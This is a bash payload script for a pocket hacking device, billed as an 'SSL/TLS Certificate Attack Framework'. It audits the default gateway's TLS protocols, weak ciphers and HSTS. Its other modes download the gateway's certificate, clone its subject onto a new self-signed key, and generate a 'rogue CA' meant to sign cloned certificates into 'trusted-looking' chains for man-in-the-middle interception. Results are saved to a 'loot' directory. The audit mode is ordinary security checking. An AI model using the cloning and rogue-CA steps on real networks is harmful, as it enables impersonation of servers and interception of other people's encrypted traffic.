#!/bin/bash
# Title: Rogue Certificate - SSL/TLS Certificate Attack Framework
# Author: bad-antics
# Description: Generate rogue certificates for MITM, detect certificate pinning, and audit TLS configurations
# Category: nullsec/interception

LOOT_DIR="/mmc/nullsec/roguecert"
mkdir -p "$LOOT_DIR"

PROMPT "ROGUE CERTIFICATE

SSL/TLS Attack Framework

Capabilities:
- Rogue CA generation
- Certificate cloning
- MITM SSL intercept
- TLS config auditing
- Cert pinning detect
- HSTS bypass checks
- Downgrade attacks

Press OK to configure."

PROMPT "CERT MODE:

1. Audit TLS Config
2. Clone Certificate
3. Generate Rogue CA
4. Full Assessment

Select mode next."

MODE=$(NUMBER_PICKER "Mode (1-4):" 4)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=4 ;; esac

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
REPORT="$LOOT_DIR/cert_${TIMESTAMP}.txt"
CERTS_DIR="$LOOT_DIR/certs"
mkdir -p "$CERTS_DIR"

{
    echo "Rogue Certificate Assessment - $(date)"
    echo "========================================="
    echo ""
} > "$REPORT"

# Check OpenSSL
if ! command -v openssl &>/dev/null; then
    ERROR_DIALOG "OpenSSL not found!

Install: opkg install openssl-util"
    exit 1
fi

# TLS Configuration Audit
audit_tls() {
    local target="$1"
    local port="${2:-443}"

    SPINNER_START "Auditing TLS: ${target}..."

    {
        echo "=== TLS AUDIT: ${target}:${port} ==="
        echo ""

        # Get certificate info
        echo "--- Certificate Info ---"
        echo | timeout 10 openssl s_client -connect "${target}:${port}" -servername "$target" 2>/dev/null | \
            openssl x509 -noout -text 2>/dev/null | \
            grep -E "Issuer:|Subject:|Not Before:|Not After:|Public Key|Signature Algorithm" || echo "  Connection failed"

        echo ""

        # Check TLS versions
        echo "--- Protocol Support ---"
        for proto in tls1 tls1_1 tls1_2 tls1_3; do
            if echo | timeout 5 openssl s_client -connect "${target}:${port}" -"$proto" 2>/dev/null | grep -q "Cipher is"; then
                echo "  $proto: SUPPORTED"
                [ "$proto" = "tls1" ] || [ "$proto" = "tls1_1" ] && echo "  ⚠ $proto is DEPRECATED"
            else
                echo "  $proto: Not supported"
            fi
        done

        echo ""

        # Check cipher suites
        echo "--- Weak Ciphers ---"
        for cipher in RC4 DES 3DES NULL EXPORT; do
            if echo | timeout 5 openssl s_client -connect "${target}:${port}" -cipher "$cipher" 2>/dev/null | grep -q "Cipher is"; then
                echo "  ⚠ WEAK CIPHER SUPPORTED: $cipher"
            fi
        done

        # Check HSTS
        echo ""
        echo "--- HSTS Check ---"
        hsts=$(curl -sI "https://${target}" 2>/dev/null | grep -i "strict-transport-security")
        if [ -n "$hsts" ]; then
            echo "  HSTS: ENABLED ($hsts)"
        else
            echo "  HSTS: ⚠ NOT SET"
        fi

        # Certificate chain
        echo ""
        echo "--- Certificate Chain ---"
        echo | timeout 10 openssl s_client -connect "${target}:${port}" -showcerts 2>/dev/null | \
            grep -E "depth=|subject=|issuer=" || echo "  Unable to retrieve chain"

    } >> "$REPORT"

    SPINNER_STOP
}

# Clone a certificate
clone_cert() {
    local target="$1"
    local port="${2:-443}"

    SPINNER_START "Cloning certificate from ${target}..."

    # Download the target certificate
    echo | timeout 10 openssl s_client -connect "${target}:${port}" -servername "$target" 2>/dev/null | \
        openssl x509 -outform PEM > "${CERTS_DIR}/original_${target}.pem" 2>/dev/null

    if [ ! -s "${CERTS_DIR}/original_${target}.pem" ]; then
        SPINNER_STOP
        echo "Failed to download certificate from ${target}" >> "$REPORT"
        return 1
    fi

    # Extract certificate details
    local subject issuer serial
    subject=$(openssl x509 -in "${CERTS_DIR}/original_${target}.pem" -noout -subject 2>/dev/null | sed 's/subject=//')
    issuer=$(openssl x509 -in "${CERTS_DIR}/original_${target}.pem" -noout -issuer 2>/dev/null | sed 's/issuer=//')

    # Generate matching key
    openssl genrsa -out "${CERTS_DIR}/clone_${target}.key" 2048 2>/dev/null

    # Create clone certificate with same subject
    openssl req -new -key "${CERTS_DIR}/clone_${target}.key" \
        -subj "$subject" \
        -out "${CERTS_DIR}/clone_${target}.csr" 2>/dev/null

    # Self-sign (would need rogue CA for trusted chain)
    openssl x509 -req -days 365 \
        -in "${CERTS_DIR}/clone_${target}.csr" \
        -signkey "${CERTS_DIR}/clone_${target}.key" \
        -out "${CERTS_DIR}/clone_${target}.pem" 2>/dev/null

    SPINNER_STOP

    {
        echo "=== CERTIFICATE CLONE ==="
        echo "Target: ${target}"
        echo "Original Subject: $subject"
        echo "Original Issuer: $issuer"
        echo "Clone: ${CERTS_DIR}/clone_${target}.pem"
        echo "Key: ${CERTS_DIR}/clone_${target}.key"
        echo ""
    } >> "$REPORT"
}

# Generate Rogue CA
generate_rogue_ca() {
    SPINNER_START "Generating rogue CA..."

    local ca_dir="${CERTS_DIR}/rogue-ca"
    mkdir -p "$ca_dir"

    # Generate CA key
    openssl genrsa -out "${ca_dir}/ca.key" 4096 2>/dev/null

    # Generate CA certificate
    openssl req -new -x509 -days 3650 \
        -key "${ca_dir}/ca.key" \
        -out "${ca_dir}/ca.pem" \
        -subj "/C=US/ST=California/O=NullSec Security/CN=NullSec Root CA" 2>/dev/null

    SPINNER_STOP

    {
        echo "=== ROGUE CA GENERATED ==="
        echo "CA Cert: ${ca_dir}/ca.pem"
        echo "CA Key: ${ca_dir}/ca.key"
        echo ""
        echo "Usage: Sign cloned certificates with this CA"
        echo "to create trusted-looking certificate chains."
        echo ""
        openssl x509 -in "${ca_dir}/ca.pem" -noout -text 2>/dev/null | head -20
    } >> "$REPORT"
}

# Determine target
GW=$(ip route | awk '/default/{print $3}')
TARGET="${GW}"

# Execute based on mode
case "$MODE" in
    1) # Audit
        audit_tls "$TARGET"
        ;;
    2) # Clone
        clone_cert "$TARGET"
        ;;
    3) # Rogue CA
        generate_rogue_ca
        ;;
    4) # Full
        generate_rogue_ca
        audit_tls "$TARGET"
        clone_cert "$TARGET"
        ;;
esac

# Count findings
WEAK_CIPHERS=$(grep -c "WEAK CIPHER" "$REPORT" 2>/dev/null || echo 0)
DEPRECATED=$(grep -c "DEPRECATED" "$REPORT" 2>/dev/null || echo 0)
MISSING_HSTS=$(grep -c "NOT SET" "$REPORT" 2>/dev/null || echo 0)

PROMPT "CERT ASSESSMENT DONE

Target: $TARGET
Weak Ciphers: $WEAK_CIPHERS
Deprecated TLS: $DEPRECATED
Missing HSTS: $MISSING_HSTS

Certs saved to:
$CERTS_DIR

Report: cert_${TIMESTAMP}.txt
Loot: $LOOT_DIR"
